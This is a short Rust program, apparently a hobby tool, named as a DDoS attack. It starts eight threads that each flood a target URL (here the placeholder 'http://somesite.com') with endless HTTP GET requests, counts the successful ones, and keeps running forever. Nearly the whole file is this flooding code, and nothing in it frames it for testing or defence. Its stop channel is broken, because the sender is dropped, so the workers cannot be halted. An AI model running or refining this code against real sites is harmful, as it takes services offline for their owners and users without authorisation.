use std::error::Error;
use std::sync::mpsc;
use std::sync::{Arc, Mutex};
use std::time::*;
use std::{fmt, thread};

use url::{ParseError, Url};

#[derive(Debug)]
struct DDosError {
    details: String,
}

impl DDosError {
    fn new(msg: &str) -> DDosError {
        DDosError {
            details: msg.to_string(),
        }
    }
}

impl fmt::Display for DDosError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.details)
    }
}

impl Error for DDosError {
    fn description(&self) -> &str {
        &self.details
    }
}

struct DDoS {
    url: Url,
    stop: mpsc::Receiver<bool>,
    amount_workers: i64,
    success_requests: Arc<Mutex<i64>>,
}

fn build_url(s: &str) -> Result<Url, ParseError> {
    let url = Url::parse(s)?;
    Ok(url)
}

#[tokio::main]
async fn make_request(url: &str, success_requests: &Arc<Mutex<i64>>) -> Result<(), reqwest::Error> {
    let res = reqwest::get(url).await?;
    res.text().await?;
    *success_requests.lock().unwrap() += 1;
    Ok(())
}

impl DDoS {
    fn new(url: &str, workers: i64) -> Result<DDoS, DDosError> {
        if workers < 1 {
            return Err(DDosError::new("Not enough workers."));
        }
        let data_url = build_url(url).unwrap();

        if data_url.host() == None {
            return Err(DDosError::new("Undefined host."));
        }
        let (_, receiver) = mpsc::channel();
        Ok(DDoS {
            url: data_url,
            stop: receiver,
            amount_workers: workers,
            success_requests: Arc::new(Mutex::new(0)),
        })
    }
    fn run(&mut self) {
        let local_workers = self.amount_workers;

        for _ in 0..local_workers {
            let url = self.url.clone().to_string();
            dbg!("{}", &url);
            let should_stop = self.stop.try_iter().next();
            let num_clone = self.success_requests.clone();
            dbg!("Outside of thread {:?}", should_stop);

            thread::spawn(move || {
                dbg!("{}", should_stop);
                dbg!("In new thread");
                loop {
                    if should_stop == Some(true) {
                        break;
                    }
                    make_request(&url, &num_clone);
                    println!("requests success -> {:?}", &num_clone);
                }
            });
        }
    }
    fn result(&mut self) -> i64 {
        *self.success_requests.lock().unwrap()
    }
}

fn main() {
    let mut ddos: DDoS = DDoS::new("http://somesite.com", 8).unwrap();
    ddos.run();
    thread::sleep(Duration::from_millis(4000));
    let result = ddos.result();
    dbg!("result is {}", result);
    loop {
        thread::sleep(Duration::from_millis(5000));
    }
}
